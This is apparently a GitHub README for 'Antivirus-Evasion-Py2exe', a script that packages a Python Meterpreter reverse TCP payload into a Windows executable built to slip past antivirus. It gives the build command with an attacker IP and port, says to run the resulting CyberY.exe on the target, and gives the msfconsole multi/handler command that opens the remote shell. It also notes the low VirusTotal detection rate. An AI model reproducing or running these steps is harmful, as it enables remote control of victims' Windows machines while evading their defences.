![GitHub language count](https://img.shields.io/github/languages/count/0xCyberY/Antivirus-Evasion-Py2exe)
![GitHub repo size](https://img.shields.io/github/repo-size/0xCyberY/Antivirus-Evasion-Py2exe)
![Lines of code](https://img.shields.io/tokei/lines/github/0xCyberY/Antivirus-Evasion-Py2exe)
![GitHub](https://img.shields.io/github/license/0xCyberY/Antivirus-Evasion-Py2exe)
![GitHub commit activity](https://img.shields.io/github/commit-activity/w/0xCyberY/Antivirus-Evasion-Py2exe)
![Twitter Follow](https://img.shields.io/twitter/follow/0xCyberY?style=social)

# Antivirus-Evasion-Py2exe
Simple python script to evade antiviruses on fully patched and updated Windows environments using a py2exe.

# Note: This script works only on Windows OS

# Prerequisite:
1. [Install Python 2.7.16 x86 for Windows](https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi)
2. [Install Py2exe 32 bits for Python 2.7](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download)

## Usage:
```
python aepy2exe.py -ip 192.168.1.10 -p 443
```

```
C:\>python aepy2exe.py -h
                                Antivirus Evasion Py2exe
 ,.      .                         ,--.                         ;-.      ,-.
/  \     |   o     o               |                o           |  )        )
|--| ;-. |-  . . , . ;-. . . ,-.   |-   . , ,-: ,-. . ,-. ;-.   |-'  . .   /  ,-. . , ,-.
|  | | | |   | |/  | |   | | `-.   |    |/  | | `-. | | | | |   |    | |  /   |-'  X  |-'
'  ' ' ' `-' ' '   ' '   `-` `-'   `--' '   `-` `-' ' `-' ' '   '    `-| '--' `-' ' ` `-'
                                                                     `-'
usage: aepy2exe.py [-h] [-e EXECUTE] [-ip ATTACKER_IP] [-p PORT]

Antivirus Evasion Py2exe

optional arguments:
  -h, --help            show this help message and exit
  -ip ATTACKER_IP, --attacker_ip ATTACKER_IP
                        specified attacker IP
  -p PORT, --port PORT  specified attcaker port

Example:
        C:\>python aepy2exe.py -e py2exe -ip <ip_address> -p <port>
```
``
The script will generate CyberY.py, build, and dist, Our execution file will be under dist.
``
![Output](https://github.com/0xCyberY/Antivirus-Evasion-Py2exe/blob/main/Output.png)

In case there is an error such as The system cannot open the device or file specified.
**Try hard!!**
#### Run the CyberY.exe
```
C:\>.\CyberY.exe
```
#### On attacker machine (Kali)
```
sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LPORT 443; set LHOST 192.168.1.10"

msf6 exploit(multi/handler) > exploit
```
# Conclusion
Keep in mind that attempting antivirus bypass is a game. Whenever a new evasion technique gets popular, antivirus vendors will eventually learn about itand update their signatures database to block it. Then, new evasion techniques will a rise, which will make vendors to add it to their signature database, and so on.

By the time of this writing, the payload was flagged as malicious by only one vendor on Virus Total.

![virus_total](https://github.com/0xCyberY/Antivirus-Evasion-Py2exe/blob/main/virus%20total.png)


**Credit** [Marcelo Sacchetin](https://infosecwriteups.com/antivirus-evasion-with-python-49185295caf1)
